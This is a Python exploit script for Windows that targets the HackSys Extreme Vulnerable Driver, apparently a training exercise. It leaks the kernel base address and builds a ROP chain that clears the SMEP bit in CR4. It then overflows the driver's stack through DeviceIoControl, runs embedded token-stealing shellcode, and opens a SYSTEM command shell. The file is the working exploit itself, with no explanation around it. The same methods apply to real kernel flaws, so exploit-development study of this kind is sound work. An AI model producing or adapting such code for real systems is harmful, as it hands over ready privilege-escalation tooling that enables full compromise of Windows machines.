import ctypes, sys, struct
from ctypes import *
from subprocess import *
import os

ntdll = windll.ntdll
kernel32 = windll.kernel32
Psapi = windll.Psapi

IS32BIT=False

def getPointer(addr):
	if IS32BIT:
		return id(addr)+20
	return id(addr)+32

def openDevice():
	print("[+] Creating handler...")
	handler = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
	if not handler or handler == -1:
		print("*** Gone wrong")
		sys.exit(0)
	print("[+] Handler ok")
	return handler

def pack(val):
	if IS32BIT:
			return struct.pack("<L",val)
	return struct.pack("<Q",val)


def find_driver_base(driver=None):
	#https://github.com/zeroSteiner/mayhem/blob/master/mayhem/exploit/windows.py # minus 32 bit support
	#crash ???
	lpImageBase = (c_ulonglong * 1024)()
	lpcbNeeded = c_longlong()
	Psapi.GetDeviceDriverBaseNameA.argtypes = [c_longlong, POINTER(c_char), c_uint32]
	driver_name_size = c_long()
	driver_name_size.value = 48
	Psapi.EnumDeviceDrivers(byref(lpImageBase), c_int(1024), byref(lpcbNeeded))
	for base_addr in lpImageBase:
		driver_name = c_char_p('\x00' * driver_name_size.value)
		if base_addr:
			Psapi.GetDeviceDriverBaseNameA(base_addr, driver_name, driver_name_size.value)
			if driver == None and driver_name.value.lower().find("krnl") != -1:
				print("[+] Kernel image : %s\n[+] Kernel base address : %s" % (driver_name.value,hex(base_addr)))
				return (base_addr, driver_name.value)
			elif driver_name.value.lower() == driver:
				print("[+] %s base address : %s" % (driver,hex(base_addr)))
				return (base_addr, driver_name.value)
	return None		

def setShellcode():
	print("[+] Set userland shellcode")
	# shellcode from https://improsec.com/blog/windows-kernel-shellcode-on-windows-10-part-1
	shellcode=""
	shellcode+=(
		"\x65\x4c\x8b\x0c\x25\x88\x01\x00\x00"  # mov    r9,QWORD PTR gs:0x188
		"\x4d\x8b\x89\x20\x02\x00\x00"          # mov    r9,QWORD PTR [r9+0x220]
		"\x4d\x8b\x81\xe0\x03\x00\x00"          # mov    r8,QWORD PTR [r9+0x3e0]
		"\x4c\x89\xc8"                          # mov    rax,r9
		"\x48\x8b\x80\xf0\x02\x00\x00"          # mov    rax,QWORD PTR [rax+0x2f0]
		"\x48\x2d\xf0\x02\x00\x00"              # sub    rax,0x2f0
		"\x4c\x39\x80\xe8\x02\x00\x00"          # cmp    QWORD PTR [rax+0x2e8],r8
		"\x75\xea"                              # jne    1a 
		"\x48\x89\xc1"                          # mov    rcx,rax
		"\x48\x81\xc1\x58\x03\x00\x00"          # add    rcx,0x358
		"\x4c\x89\xc8"                          # mov    rax,r9
		"\x48\x8b\x80\xf0\x02\x00\x00"          # mov    rax,QWORD PTR [rax+0x2f0]
		"\x48\x2d\xf0\x02\x00\x00"              # sub    rax,0x2f0
		"\x48\x83\xb8\xe8\x02\x00\x00\x04"      # cmp    QWORD PTR [rax+0x2e8],0x4
		"\x75\xe9"                              # jne    3d
		"\x48\x89\xc2"                          # mov    rdx,rax
		"\x48\x81\xc2\x58\x03\x00\x00"          # add    rdx,0x358
		"\x48\x8b\x12"                          # mov    rdx,QWORD PTR [rdx]
		"\x48\x89\x11"                          # mov    QWORD PTR [rcx],rdx
		                                        # restore IRP and fix stack pointer # add rsp, 0x28, the ropchain pop 3 qword : 0x28 - 0x18 = 0x10
		"\x48\x8b\x5c\x24\x58"                  # mov    rbx,QWORD PTR [rsp+0x58] # restore irp struct https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/ns-wdm-_io_status_block
		"\x48\x83\xc4\x10"                      # add rsp, 0x10 # fffff800`691662a5 488d0db40c0000  lea     rcx,[HEVD! ?? ::NNGAKEGL::`string' (fffff800`69166f60)] (ret after TriggerStackOverflow) 
		"\xc3"									# ret
	)
	ptrShellcode=getPointer(shellcode)
	kernel32.VirtualProtect(ptrShellcode, c_int(len(shellcode)),0x40,byref(c_long(1)))
	print("[+] Shellcode address : 0x%x" % (ptrShellcode))
	return ptrShellcode

def leak_kernel_base():
	OFFSET_ADDR_KERNEL_BASE=24
	buf = "\x00"
	sil = c_ulong(0)
	res = ntdll.NtQuerySystemInformation(11, getPointer(buf), len(buf), byref(sil))
	buf = "\x00"*sil.value
	res = ntdll.NtQuerySystemInformation(11, getPointer(buf), len(buf), byref(sil))
	base_address=struct.unpack('<Q',buf[OFFSET_ADDR_KERNEL_BASE:OFFSET_ADDR_KERNEL_BASE+8])[0]
	print("[+] Kernel base address : 0x%x" % (base_address))
	return base_address

handler=openDevice()
ptrShellcode=setShellcode()
kernel_base=leak_kernel_base()
#kernel_base=find_driver_base()[0]

ropchain=""
ropchain+=pack(kernel_base+0xa08d)   # pop rcx;ret
ropchain+=pack(0x406f8)              # cr4 value
ropchain+=pack(kernel_base+0x7274e)  # mov cr4, rcx;ret
ropchain+=pack(ptrShellcode)

buf="a"*0x808+ropchain


print("[+] Trigger ropchain + shellcode")
kernel32.DeviceIoControl(handler, 2236419, getPointer(buf), len(buf), None, 0, byref(c_ulong()), None)
print("[+] Get system shell")
Popen("start cmd", shell=True)

